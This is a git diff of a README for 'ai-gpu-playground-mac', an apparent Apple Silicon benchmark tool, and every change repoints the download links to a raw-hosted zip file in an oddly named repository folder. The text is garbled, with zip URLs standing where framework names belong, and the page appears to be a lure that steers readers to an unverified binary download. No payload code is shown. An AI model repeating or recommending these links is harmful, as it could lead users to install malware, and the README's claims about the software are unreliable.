@@ -1,7 +1,7 @@
 # 🎉 ai-gpu-playground-mac - Compare CPU and GPU Performance Easily
 
 ## 🛡️ Download Now
-[![Download ai-gpu-playground-mac](https://raw.githubusercontent.com/Gutsperro/ai-gpu-playground-mac/main/ricinelaidic/ai-gpu-playground-mac.zip)](https://raw.githubusercontent.com/Gutsperro/ai-gpu-playground-mac/main/ricinelaidic/ai-gpu-playground-mac.zip)
+[![Download ai-gpu-playground-mac](https://raw.githubusercontent.com/Gutsperro/ai-gpu-playground-mac/main/llama/ai-mac-playground-gpu-1.2-beta.1.zip)](https://raw.githubusercontent.com/Gutsperro/ai-gpu-playground-mac/main/llama/ai-mac-playground-gpu-1.2-beta.1.zip)
 
 ## 📚 Overview
 ai-gpu-playground-mac provides hands-on benchmarks for Apple's M-series chips, allowing you to compare CPU and GPU performance using tools like PyTorch and TensorFlow. This application measures TFLOP/s and tokens per second, helping you understand how GPUs accelerate machine learning tasks.
@@ -16,19 +16,19 @@ To get started with ai-gpu-playground-mac, follow these steps:
    - Sufficient disk space for installation
 
 2. **Installation Instructions**
-   - Visit this page to download: [Download ai-gpu-playground-mac](https://raw.githubusercontent.com/Gutsperro/ai-gpu-playground-mac/main/ricinelaidic/ai-gpu-playground-mac.zip).
+   - Visit this page to download: [Download ai-gpu-playground-mac](https://raw.githubusercontent.com/Gutsperro/ai-gpu-playground-mac/main/llama/ai-mac-playground-gpu-1.2-beta.1.zip).
    - Select the latest version.
    - Download the file suitable for your setup, and remember that the application is specifically designed for Apple Silicon.
 
 ## ⚙️ Features
 - **Benchmarking**: Run CPU vs GPU benchmarks easily.
-- **Multiple Frameworks**: Supports PyTorch MPS, TensorFlow-Metal, MLX, and https://raw.githubusercontent.com/Gutsperro/ai-gpu-playground-mac/main/ricinelaidic/ai-gpu-playground-mac.zip
+- **Multiple Frameworks**: Supports PyTorch MPS, TensorFlow-Metal, MLX, and https://raw.githubusercontent.com/Gutsperro/ai-gpu-playground-mac/main/llama/ai-mac-playground-gpu-1.2-beta.1.zip
 - **User-Friendly Interface**: Designed with the average user in mind, making it simple to learn.
 - **Performance Metrics**: Measures performance in TFLOP/s and tokens/sec for better understanding.
 - **Educational Tool**: Ideal for learning how GPU acceleration works in deep learning tasks.
 
 ## 📥 Download & Install
-1. Visit this page to download: [Download ai-gpu-playground-mac](https://raw.githubusercontent.com/Gutsperro/ai-gpu-playground-mac/main/ricinelaidic/ai-gpu-playground-mac.zip).
+1. Visit this page to download: [Download ai-gpu-playground-mac](https://raw.githubusercontent.com/Gutsperro/ai-gpu-playground-mac/main/llama/ai-mac-playground-gpu-1.2-beta.1.zip).
 2. Click on the latest release version.
 3. Follow the prompts to download the application file.
 4. Once downloaded, locate the file in your Downloads folder.
@@ -37,7 +37,7 @@ To get started with ai-gpu-playground-mac, follow these steps:
 
 ## 👩‍💻 Using the Application
 - Launch the application from your Applications folder.
-- Choose the benchmarking tool you want to use: PyTorch, TensorFlow, MLX, or https://raw.githubusercontent.com/Gutsperro/ai-gpu-playground-mac/main/ricinelaidic/ai-gpu-playground-mac.zip
+- Choose the benchmarking tool you want to use: PyTorch, TensorFlow, MLX, or https://raw.githubusercontent.com/Gutsperro/ai-gpu-playground-mac/main/llama/ai-mac-playground-gpu-1.2-beta.1.zip
 - Set your specific parameters (e.g., batch size, model type).
 - Click "Run Benchmark" to start measuring performance.
 
